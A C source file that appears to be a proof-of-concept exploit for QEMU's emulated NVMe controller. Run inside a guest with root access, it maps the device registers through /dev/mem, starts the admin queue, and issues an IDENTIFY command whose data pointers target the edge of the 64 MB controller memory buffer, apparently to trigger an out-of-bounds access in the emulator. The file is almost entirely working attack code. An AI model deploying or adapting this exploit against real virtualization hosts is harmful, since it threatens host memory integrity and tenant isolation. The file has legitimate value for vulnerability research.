/*
    Boot command : 
            -drive file=./nvme.img,if=none,id=D22 -device nvme,drive=D22,serial=1234,cmb_size_mb=64
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "common.h"


uint32_t mmio_addr = 0xfebd0000;
uint32_t mmio_size = 0x2000;

char *mmio_base;

typedef struct NvmeCmd {
    uint8_t     opcode;
    uint8_t     fuse;
    uint16_t    cid;
    uint32_t    nsid;
    uint64_t    res1;
    uint64_t    mptr;
    uint64_t    prp1;
    uint64_t    prp2;
    uint32_t    cdw10;
    uint32_t    cdw11;
    uint32_t    cdw12;
    uint32_t    cdw13;
    uint32_t    cdw14;
    uint32_t    cdw15;
} NvmeCmd;

NvmeCmd *cmds;

void nvme_wr32(uint32_t addr, uint32_t value)
{
    *((uint32_t*)(mmio_base + addr)) = value;
}

uint32_t nvme_rd32(uint32_t addr)
{
    return *((uint32_t*)(mmio_base + addr));
}

void exploit() {
    nvme_wr32(0x14, 0);             // nvme_clear_ctrl

    nvme_wr32(0x28, gva_to_gpa(cmds));
    nvme_wr32(0x2c, gva_to_gpa(cmds) >> 32);

    uint32_t data = 1;
    data |= 6 << 16;                //  sqes
    data |= 4 << 20;                //  cqes
    nvme_wr32(0x14, data);              // nvme_start_ctrl

    NvmeCmd *cmd = &cmds[0];
    cmd->opcode = 6;                // NVME_ADM_CMD_IDENTIFY
    cmd->cdw10 = 1;                 // NVME_ID_CNS_CTRL
    cmd->prp1 = 0xf8000000 + 0x500;
    cmd->prp2 = 0xf8000000 + 0x4000000;                  // 0


    nvme_wr32(0x1000, 1);
}

int main(int argc, char *argv[]){
    mmio_base = mem_map( "/dev/mem", mmio_addr, mmio_size );
    if ( !mmio_base ) {
        return 0;
    }

    cmds = (NvmeCmd *)aligned_alloc(0x1000, 20 * sizeof(NvmeCmd));
    memset(cmds, 0xb, sizeof(cmds));
    printf("mmio_base = 0x%lx\n", (long)mmio_base);
    printf("cmd phy addr = 0x%lx\n", (long)gva_to_gpa(cmds));
    exploit();
}

